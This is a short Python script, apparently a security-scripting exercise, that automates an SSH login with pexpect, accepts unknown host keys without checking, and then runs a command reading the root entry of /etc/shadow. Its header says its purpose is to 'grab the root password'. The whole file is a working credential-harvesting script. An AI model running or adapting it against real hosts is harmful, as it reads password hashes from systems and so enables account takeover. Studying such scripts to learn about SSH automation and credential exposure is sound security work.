#!/usr/bin/python
#-*- coding:utf-8 -*-
#Author: Isaac Privett
#Date: 05-01-2022
#Description: Program to auto login ssh and grab the root password

import pexpect

PROMPT = ['# ', '>>> ', '> ', '\$ ']

def send_command(child, command):
	child.sendline(command)
	child. expect(PROMPT)
	print(child.before)

def connect(user, host, password):
	ssh_newkey = 'Are you sure you want to continue connecting'
	connStr = 'ssh ' + user + '@' + host
	child = pexpect.spawn(connStr)
	ret = child.expect([pexpect.TIMEOUT, ssh_newkey, '[P|p]assword: '])
	if ret == 0:
		print("[-] Connection Error")
		return
	if ret == 1:
		child.sendline('yes')
		ret = child.expect([pexpect.TIMEOUT, '[P|p]assword: '])
		if ret == 0:
			print("[-] Connection Error")
			return
	child.sendline(password)
	child.expect(PROMPT)
	return child

def main():
	host = input("Enter host ip address: ")
	user = input("Enter SSH username: ")
	password = input("Enter password: ")
	child = connect(user,host,password)
	send_command(child, 'cat /etc/shadow | grep root;ps')
main()
